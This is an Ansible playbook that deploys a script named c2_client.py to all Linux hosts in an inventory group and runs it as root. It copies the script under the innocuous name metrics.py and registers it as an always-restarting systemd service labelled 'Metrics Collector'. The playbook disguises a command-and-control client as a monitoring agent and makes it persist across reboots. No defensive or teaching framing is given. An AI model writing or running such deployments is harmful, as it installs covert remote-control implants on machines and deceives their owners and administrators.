---
- name: Deploy client to all Linux hosts
  hosts: linux
  become: yes

  vars:
    service_name: metrics-collector
    service_dir: /var/lib/metrics-collector
    script_name: metrics.py

  tasks:
    - name: Update apt cache
      apt:
        update_cache: yes

    - name: Ensure required packages are installed
      apt:
        name:
          - python3
          - python3-pip
          - curl
        state: present

    - name: Create application directory
      file:
        path: "{{ service_dir }}"
        state: directory
        mode: '0755'

    - name: Copy client script
      copy:
        src: ./c2_client.py
        dest: "{{ service_dir }}/{{ script_name }}"
        mode: '0755'

    - name: Create systemd service
      copy:
        dest: "/etc/systemd/system/{{ service_name }}.service"
        content: |
          [Unit]
          Description=Metrics Collector
          After=network.target

          [Service]
          ExecStart=/usr/bin/python3 {{ service_dir }}/{{ script_name }}
          Restart=always
          RestartSec=5

          [Install]
          WantedBy=multi-user.target

    - name: Reload systemd daemon
      command: systemctl daemon-reexec

    - name: Enable and start service
      systemd:
        name: "{{ service_name }}"
        enabled: yes
        state: started